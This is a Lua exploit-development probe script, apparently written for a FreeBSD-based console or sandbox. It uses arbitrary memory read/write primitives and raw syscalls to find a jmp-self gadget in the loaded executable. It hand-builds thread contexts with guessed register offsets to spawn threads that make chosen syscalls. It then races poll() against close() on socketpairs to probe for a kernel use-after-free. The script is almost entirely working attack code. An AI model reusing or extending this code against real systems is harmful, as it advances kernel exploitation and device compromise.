-- CRASH_CLASS: MODERATE
-- PROBE 1234a: (a) verify the GPR block mapping by making a child call close(fd);
--              (b) if the mapping holds, race poll() against close() on a socketpair.
-- The mcontext tail is known from 1229a (RIP +0xE0, CS +0xE8, RFLAGS +0xF0, RSP +0xF8, SS +0x100).
-- FreeBSD order puts the fifteen GPRs immediately before the trap fields, so rdi is the first slot
-- at +0x48 and rax is the seventh at +0x78. This probe tests that guess instead of trusting it.
print("=== PROBE 1234a: gpr mapping and poll+close ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function rb(a) local ok,v=pcall(function() return N(memory.read_byte(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn) local ok, rv = pcall(fn) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l = hilo(rv) print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES())) return rv end
local eb = N(eboot_base)
print(string.format("[0] pid=%d eboot=0x%X", N(mk(20)()), eb))
local jmp_self = nil
for off = 0, 0x40000, 1 do
  local b0,b1
  do local ok,v = pcall(function() return N(memory.read_byte(eb+off)) end) if ok then b0=v end end
  do local ok,v = pcall(function() return N(memory.read_byte(eb+off+1)) end) if ok then b1=v end end
  if b0 == 0xEB and b1 == 0xFE then jmp_self = eb+off break end
end
if not jmp_self then print("no gadget"); print("=== DONE ===") return end
local STUB = N(syscall.pipe.fn_addr)
print(string.format("    syscall stub = 0x%X", STUB))
local function spawn(rax, rdi, rsi, rdx, tag)
  local stk = N(mk(477)(uint64(0),uint64(0x10000),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)))
  if stk == 0 then return nil end
  local top = stk + 0x10000 - 0x100
  wq(top, uint64(jmp_self))
  local ctx = memory.alloc(0x500)
  for i = 0, 0x4F8, 8 do wq(ctx + i, 0) end
  wq(ctx + 0x48, uint64(rdi))   -- rdi (guess)
  wq(ctx + 0x50, uint64(rsi))   -- rsi
  wq(ctx + 0x58, uint64(rdx))   -- rdx
  wq(ctx + 0x78, uint64(rax))   -- rax
  wq(ctx + 0x0c0, uint64(0x43))
  wq(ctx + 0x0e0, uint64(STUB))
  wq(ctx + 0x0f8, uint64(top))
  wq(ctx + 0x100, uint64(0x3B))
  wq(ctx + 0x108, uint64(0x480))
  wd(ctx + 0x0d0, 0)
  wq(ctx + 0x110, uint64(0x10000))
  local tb = memory.alloc(8) wq(tb, uint64(0xDEADDEAD))
  local ok, rv = pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0),uint64(0),uint64(0),uint64(0)) end)
  local tid = N(uint64(tb))
  print(string.format("    spawn %s rax=%d rdi=0x%X -> rv=%s tid=0x%X", tag, rax, rdi, tostring(ok and N(rv) or "err"), tid))
  return tid
end
print("[A] mapping test: child calls close(fd0)")
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("    fds %d %d", fd0, fd1))
if fd0 <= 0 then print("=== DONE ===") return end
local t1 = spawn(6, fd0, 0, 0, "close")
local ts = memory.alloc(16) wq(ts,0) wq(ts+8, 100000000)
pcall(function() mk(240)(uint64(ts),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local s0 = memory.alloc(0x40)
local rv = N(mk(189)(uint64(fd0),uint64(s0),uint64(0),uint64(0),uint64(0),uint64(0)))
print(string.format("    fstat(fd0) after child = %d err=%s  (EBADF => the child really closed it)", rv, ES()))
print("[B] poll+close race, 60 iterations")
local fds = memory.alloc(16)   -- struct pollfd {int fd; short events; short revents}
local alive, closed = 0, 0
for i = 1, 60 do
  local s2 = memory.alloc(8) wd(s2,0) wd(s2+4,0)
  mk(135)(uint64(1),uint64(1),uint64(0),uint64(s2))
  local a, b = rd(s2), rd(s2+4)
  if a > 0 then
    wd(fds, a) wd(fds+4, 1) wd(fds+8, 0) wd(fds+12, 0)
    local tp = spawn(209, N(uint64(fds)), 1, 3000, "poll")
    if tp then
      wq(ts,0) wq(ts+8, 2000000)
      pcall(function() mk(240)(uint64(ts),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
      pcall(function() mk(6)(uint64(a),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
      closed = closed + 1
    end
    pcall(function() mk(6)(uint64(b),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
  end
end
print(string.format("    iterations=%d raced=%d pid_end=%d", 60, closed, N(mk(20)())))
print("=== DONE ===")